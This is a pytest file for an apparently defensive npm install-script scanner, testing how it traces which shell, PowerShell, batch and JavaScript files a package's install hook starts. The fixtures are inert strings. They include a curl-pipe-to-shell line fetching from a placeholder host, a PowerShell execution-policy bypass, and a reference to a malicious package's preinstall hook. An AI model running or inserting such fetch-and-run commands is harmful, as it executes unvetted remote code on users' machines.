"""`install.script_started` and Windows hook paths (round 4 G), on small inert trees: nothing
here runs, the scripts are strings."""

import json

import pytest

from kitsunox.ecosystems.npm.install import (
    MAX_SPAWNED,
    SCRIPT_DEPTH,
    files_named,
    install_sources,
    script_started,
)


def tree(hook: str, files: dict[str, bytes]) -> dict[str, bytes]:
    return {"package.json": json.dumps({"scripts": {"postinstall": hook}}).encode(), **files}


@pytest.mark.parametrize(
    "command",
    [
        "powershell -ExecutionPolicy Bypass -File .\\scripts\\x.ps1",
        "powershell -File scripts\\x.ps1",
        'pwsh -File ".\\scripts\\x.ps1"',
        "powershell -File ./scripts/x.ps1",
    ],
)
def test_windows_hook_paths(command: str) -> None:
    files = {"scripts/x.ps1": b"Write-Host hi\n"}
    assert files_named(command, files) == {"scripts/x.ps1"}


def test_windows_path_to_javascript() -> None:
    """`company-ts@1.0.3` (`vm-day1`, malicious): `"preinstall": "node lib\\index.js"`."""
    files = tree("node lib\\index.js", {"lib/index.js": b"require('child_process')\n"})
    assert "lib/index.js" in install_sources(files)


@pytest.mark.parametrize(
    ("script", "started"),
    [
        (b"sh ./stage2.sh\n", "scripts/stage2.sh"),
        (b'. "$(dirname "$0")/stage2.sh"\n', "scripts/stage2.sh"),
        (b'bash "${SCRIPT_DIR}/stage2.sh" --yes\n', "scripts/stage2.sh"),
        (b"bash scripts/stage2.sh\n", "scripts/stage2.sh"),  # from the package root
        (b"node ./lib/run.js\n", "scripts/lib/run.js"),
        (b"stage2.sh\n", "scripts/stage2.sh"),  # a bare name in the script's directory
    ],
)
def test_shell_starts(script: bytes, started: str) -> None:
    files = {
        "scripts/setup.sh": script,
        "scripts/stage2.sh": b"echo two\n",
        "scripts/lib/run.js": b"x()\n",
    }
    assert set(script_started({"scripts/setup.sh": script}, files)) == {started}


def test_powershell_and_batch_start() -> None:
    files = {
        "a.ps1": b'& "$PSScriptRoot\\helper.ps1"\n',
        "helper.ps1": b"Write-Host x\n",
        "b.bat": b"call %~dp0setup.bat\npowershell -File %~dp0tools\\x.ps1\n",
        "setup.bat": b"echo x\n",
        "tools/x.ps1": b"Write-Host x\n",
    }
    assert set(script_started({"a.ps1": files["a.ps1"]}, files)) == {"helper.ps1"}
    assert set(script_started({"b.bat": files["b.bat"]}, files)) == {"setup.bat", "tools/x.ps1"}


@pytest.mark.parametrize(
    "script",
    [
        b"curl -fsSL https://get.x.invalid/stage2.sh | sh\n",  # downloaded, not the package's
        b"# then run ./stage2.sh\n",  # a comment
        b"echo 'run ./stage2.sh next'\n",  # a message
        b"bash ../../outside.sh\n",  # outside the package
    ],
)
def test_not_started(script: bytes) -> None:
    files = {"setup.sh": script, "stage2.sh": b"echo x\n"}
    assert script_started({"setup.sh": script}, files) == {}


def test_depth_and_install_sources() -> None:
    """`sh setup.sh` -> `two.sh` -> `three.sh` -> `four.sh`: `SCRIPT_DEPTH` levels past the
    hook's own script; the JavaScript a started script runs is followed too."""
    assert SCRIPT_DEPTH == 2
    files = tree(
        "sh setup.sh",
        {
            "setup.sh": b"sh ./two.sh\n",
            "two.sh": b"sh ./three.sh\nnode ./x.js\n",
            "three.sh": b"sh ./four.sh\n",
            "four.sh": b"echo four\n",
            "x.js": b"require('./y')\n",
            "y.js": b"y()\n",
        },
    )
    sources = install_sources(files)
    assert {"setup.sh", "two.sh", "three.sh", "x.js", "y.js"} <= set(sources)
    assert "four.sh" not in sources


def test_cap() -> None:
    script = "".join(f"sh ./s{n}.sh\n" for n in range(MAX_SPAWNED + 5)).encode()
    files = {"setup.sh": script} | {f"s{n}.sh": b"echo\n" for n in range(MAX_SPAWNED + 5)}
    assert len(script_started({"setup.sh": script}, files)) == MAX_SPAWNED
